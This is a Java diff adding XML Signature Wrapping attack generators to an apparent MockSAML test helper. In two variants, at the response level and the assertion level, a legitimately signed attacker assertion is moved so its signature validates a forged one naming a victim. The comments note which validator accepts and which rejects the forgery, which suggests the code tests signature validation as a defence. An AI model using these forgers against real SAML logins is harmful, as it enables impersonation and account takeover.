@@ -304,6 +304,191 @@ public class MockSAML {
         }
     }
 
+    private static void signResponse(Response response, KeyMaterial km) {
+        try {
+            Credential cred = CredentialSupport.getSimpleCredential(km.certificate, km.privateKey);
+            SignatureBuilder signatureBuilder = new SignatureBuilder();
+            Signature signature = signatureBuilder.buildObject();
+            signature.setSigningCredential(cred);
+            signature.setSignatureAlgorithm(SignatureConstants.ALGO_ID_SIGNATURE_RSA_SHA256);
+            signature.setCanonicalizationAlgorithm(SignatureConstants.ALGO_ID_C14N_EXCL_OMIT_COMMENTS);
+            signature.setKeyInfo(buildKeyInfoWithCert(km.certificate));
+
+            response.setSignature(signature);
+            XMLObjectSupport.marshall(response);
+            Signer.signObject(signature);
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    private static Response buildSingleAssertionResponse(
+            String issuerEntityId, String audience, String acsUrl, String nameId,
+            String inResponseTo, Instant now, Instant notOnOrAfter, boolean withConditions) {
+        Response response = build(Response.DEFAULT_ELEMENT_NAME);
+        response.setID(randomId());
+        response.setVersion(SAMLVersion.VERSION_20);
+        response.setIssueInstant(now);
+        response.setDestination(acsUrl);
+        if (inResponseTo != null) {
+            response.setInResponseTo(inResponseTo);
+        }
+
+        Issuer issuer = build(Issuer.DEFAULT_ELEMENT_NAME);
+        issuer.setValue(issuerEntityId);
+        response.setIssuer(issuer);
+
+        Status status = build(Status.DEFAULT_ELEMENT_NAME);
+        StatusCode statusCode = build(StatusCode.DEFAULT_ELEMENT_NAME);
+        statusCode.setValue(StatusCode.SUCCESS);
+        status.setStatusCode(statusCode);
+        response.setStatus(status);
+
+        response.getAssertions().add(buildAssertion(
+                issuerEntityId, nameId, audience, acsUrl, inResponseTo, now, notOnOrAfter, withConditions));
+        return response;
+    }
+
+    /**
+     * XML Signature Wrapping — response-level variant (advisory variant A).
+     *
+     * The IdP legitimately signs a Response for the attacker's own account (response-level
+     * signature, Reference URI = that Response's ID). The attacker lifts that ds:Signature out
+     * and reparents it onto a freshly authored Response whose assertion names the victim, then
+     * parks the original signed Response — untouched apart from the removed signature, so its ID
+     * still matches the Reference — inside a samlp:Extensions element of the new Response.
+     *
+     * SignatureValidator.validate() alone accepts this: the Reference still resolves (to the
+     * parked Response) and the cryptography checks out. Only SAMLSignatureProfileValidator, which
+     * requires the Reference to name the enclosing Response's own ID, rejects it.
+     */
+    public static String generateResponseLevelXSWWrappedSAMLResponseBase64(
+            String issuerEntityId, String audience, String acsUrl,
+            String legitimateNameId, String forgedNameId, String inResponseTo,
+            KeyMaterial keyMaterial, int notOnOrAfterSeconds) {
+        Instant now = Instant.now();
+        Instant notOnOrAfter = now.plusSeconds(Math.max(60, notOnOrAfterSeconds));
+
+        Response legit = buildSingleAssertionResponse(
+                issuerEntityId, audience, acsUrl, legitimateNameId, inResponseTo, now, notOnOrAfter, true);
+        signResponse(legit, keyMaterial);
+        org.w3c.dom.Document legitDoc = parseXml(toXmlString(legit));
+        org.w3c.dom.Element legitResp = legitDoc.getDocumentElement();
+        org.w3c.dom.Element sig = firstChildNS(legitResp, DS_NS, "Signature");
+        legitResp.removeChild(sig);
+
+        Response evil = buildSingleAssertionResponse(
+                issuerEntityId, audience, acsUrl, forgedNameId, inResponseTo, now, notOnOrAfter, true);
+        org.w3c.dom.Document evilDoc = parseXml(toXmlString(evil));
+        org.w3c.dom.Element evilResp = evilDoc.getDocumentElement();
+
+        // Reparent the borrowed signature onto the forged Response (right after Issuer).
+        org.w3c.dom.Node importedSig = evilDoc.importNode(sig, true);
+        insertAfter(evilResp, importedSig, firstChildNS(evilResp, SAML_NS, "Issuer"));
+
+        // Park the genuinely-signed (now signature-less) Response under samlp:Extensions,
+        // where its ID keeps the borrowed signature's Reference resolvable.
+        org.w3c.dom.Element extensions = evilDoc.createElementNS(SAMLP_NS, "samlp:Extensions");
+        extensions.appendChild(evilDoc.importNode(legitResp, true));
+        insertAfter(evilResp, extensions, importedSig);
+
+        return Base64.getEncoder().encodeToString(serialize(evilResp).getBytes(StandardCharsets.UTF_8));
+    }
+
+    /**
+     * XML Signature Wrapping — assertion-level variant (advisory variant B).
+     *
+     * The IdP legitimately signs an assertion for the attacker's own account. The attacker lifts
+     * that assertion's ds:Signature onto a forged assertion naming the victim, and parks the
+     * genuinely-signed (now signature-less) attacker assertion inside the forged assertion's
+     * saml:Advice element, where its ID keeps the Reference resolvable. This survives the
+     * per-assertion "every assertion must carry a valid signature" loop — the forged assertion
+     * does carry one — but SAMLSignatureProfileValidator rejects it because the Reference names
+     * the parked assertion's ID, not the forged assertion's own ID.
+     */
+    public static String generateAssertionLevelXSWWrappedSAMLResponseBase64(
+            String issuerEntityId, String audience, String acsUrl,
+            String legitimateNameId, String forgedNameId, String inResponseTo,
+            KeyMaterial keyMaterial, int notOnOrAfterSeconds) {
+        Instant now = Instant.now();
+        Instant notOnOrAfter = now.plusSeconds(Math.max(60, notOnOrAfterSeconds));
+
+        // Attacker's own response with an assertion-level signature.
+        Response legit = buildSingleAssertionResponse(
+                issuerEntityId, audience, acsUrl, legitimateNameId, inResponseTo, now, notOnOrAfter, true);
+        signAssertion(legit.getAssertions().get(0), keyMaterial);
+        org.w3c.dom.Document legitDoc = parseXml(toXmlString(legit));
+        org.w3c.dom.Element legitAssertion = firstChildNS(legitDoc.getDocumentElement(), SAML_NS, "Assertion");
+        org.w3c.dom.Element aSig = firstChildNS(legitAssertion, DS_NS, "Signature");
+        legitAssertion.removeChild(aSig);
+
+        // Forged, unsigned response naming the victim.
+        Response evil = buildSingleAssertionResponse(
+                issuerEntityId, audience, acsUrl, forgedNameId, inResponseTo, now, notOnOrAfter, true);
+        org.w3c.dom.Document evilDoc = parseXml(toXmlString(evil));
+        org.w3c.dom.Element evilResp = evilDoc.getDocumentElement();
+        org.w3c.dom.Element forgedAssertion = firstChildNS(evilResp, SAML_NS, "Assertion");
+
+        // Reparent the borrowed signature onto the forged assertion (right after its Issuer).
+        org.w3c.dom.Node importedSig = evilDoc.importNode(aSig, true);
+        insertAfter(forgedAssertion, importedSig, firstChildNS(forgedAssertion, SAML_NS, "Issuer"));
+
+        // Park the genuinely-signed (now signature-less) attacker assertion in saml:Advice.
+        org.w3c.dom.Element advice = evilDoc.createElementNS(SAML_NS, "saml:Advice");
+        advice.appendChild(evilDoc.importNode(legitAssertion, true));
+        forgedAssertion.appendChild(advice);
+
+        return Base64.getEncoder().encodeToString(serialize(evilResp).getBytes(StandardCharsets.UTF_8));
+    }
+
+    private static final String SAMLP_NS = "urn:oasis:names:tc:SAML:2.0:protocol";
+    private static final String SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion";
+    private static final String DS_NS = "http://www.w3.org/2000/09/xmldsig#";
+
+    private static org.w3c.dom.Document parseXml(String xml) {
+        try {
+            javax.xml.parsers.DocumentBuilderFactory dbf = javax.xml.parsers.DocumentBuilderFactory.newInstance();
+            dbf.setNamespaceAware(true);
+            return dbf.newDocumentBuilder().parse(
+                    new java.io.ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    private static org.w3c.dom.Element firstChildNS(org.w3c.dom.Element parent, String ns, String localName) {
+        org.w3c.dom.NodeList children = parent.getChildNodes();
+        for (int i = 0; i < children.getLength(); i++) {
+            org.w3c.dom.Node n = children.item(i);
+            if (n.getNodeType() == org.w3c.dom.Node.ELEMENT_NODE
+                    && ns.equals(n.getNamespaceURI()) && localName.equals(n.getLocalName())) {
+                return (org.w3c.dom.Element) n;
+            }
+        }
+        throw new IllegalStateException("child element {" + ns + "}" + localName + " not found");
+    }
+
+    private static void insertAfter(org.w3c.dom.Element parent, org.w3c.dom.Node newNode, org.w3c.dom.Node refNode) {
+        org.w3c.dom.Node next = refNode.getNextSibling();
+        if (next == null) {
+            parent.appendChild(newNode);
+        } else {
+            parent.insertBefore(newNode, next);
+        }
+    }
+
+    private static String serialize(org.w3c.dom.Node node) {
+        try {
+            javax.xml.transform.Transformer t = javax.xml.transform.TransformerFactory.newInstance().newTransformer();
+            java.io.StringWriter sw = new java.io.StringWriter();
+            t.transform(new javax.xml.transform.dom.DOMSource(node),
+                    new javax.xml.transform.stream.StreamResult(sw));
+            return sw.toString();
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
+
     /**
      * Builds a SAML Response that demonstrates the XML Signature Wrapping (XSW) attack:
      *
